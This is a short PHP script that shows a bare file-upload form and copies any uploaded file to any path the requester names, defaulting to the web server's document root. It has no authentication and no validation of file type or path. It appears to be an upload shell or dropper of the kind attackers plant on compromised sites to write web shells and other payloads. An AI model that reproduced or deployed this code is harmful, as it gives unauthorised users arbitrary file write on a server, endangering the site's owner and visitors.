<?php
$self = $_SERVER['PHP_SELF'];
$docr = $_SERVER['DOCUMENT_ROOT'];
$sern = $_SERVER['SERVER_NAME'];
$tend = "</tr></form></table><br><br><br><br>";
if (!empty($_GET['ac'])) {$ac = $_GET['ac'];}
elseif (!empty($_POST['ac'])) {$ac = $_POST['ac'];}
else {$ac = "upload";}
switch($ac) {
case "upload":
echo <<<HTML
<table>
<form enctype="multipart/form-data" action="$self" method="POST">
<input type="hidden" name="ac" value="upload">
<tr>
<input size="5" name="file" type="file"></td>
</tr>
<tr>
<td><input size="10" value="$docr/" name="path" type="text"><input type="submit" value="ОК"></td>
$tend
HTML;
if (isset($_POST['path'])){
$uploadfile = $_POST['path'].$_FILES['file']['name'];
if ($_POST['path']==""){$uploadfile = $_FILES['file']['name'];}

if (copy($_FILES['file']['tmp_name'], $uploadfile)) {
    echo "File  ".$_FILES['file']['name']."  uploaded";
} else {
    print "Not working: info:\n";
    print_r($_FILES);
}
}
break;
}
?>
</pre>
